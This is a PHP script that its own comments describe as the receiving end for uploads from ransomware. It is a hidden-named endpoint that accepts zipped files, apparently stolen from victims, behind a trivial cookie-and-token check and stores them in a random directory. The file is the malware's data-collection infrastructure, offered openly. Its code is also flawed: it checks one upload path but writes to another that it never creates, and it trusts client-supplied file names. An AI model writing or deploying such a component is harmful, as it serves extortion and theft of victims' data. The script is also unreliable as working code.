<?php
// this file has a random name to avoid discovery through directory listing
//  Handles  upload requests from the ransomware.
$random_string = bin2hex(random_bytes(32));
// check authenticity of request through cookie and token in POST data
if (isset($_COOKIE['token']) && isset($_POST['token']) && $_COOKIE['token'] == $_POST['token']) {
    if (isset($_FILES['file'])) {
        if ($_FILES['file']['type'] == 'application/zip') {
            if ($_FILES['file']['size'] > 0) {
                if ($_FILES['file']['size'] < 1000000) {
                    if ($_FILES['file']['error'] == 0) {
                        if (!file_exists('./uploads/'.$_FILES['file']['name'])) {
                            if (move_uploaded_file($_FILES['file']['tmp_name'], '../uploads/under_review/'.$random_string.'/'.$_FILES['file']['name'])) {
                                echo 'File uploaded successfully';
                            } else {
                                echo 'Error uploading file';
                            }
                        } else {
                            echo 'File already uploaded';
                        }
                    } else {
                        echo 'File corrupted';
                    }
                } else {
                    echo 'File too big';
                }
            } else {
                echo 'File empty';
            }
        } else {
            echo 'File not a zip file';
        }
    } else {
        echo 'No file uploaded';
    }
} else {
    echo 'Unauthorized request';
}
?>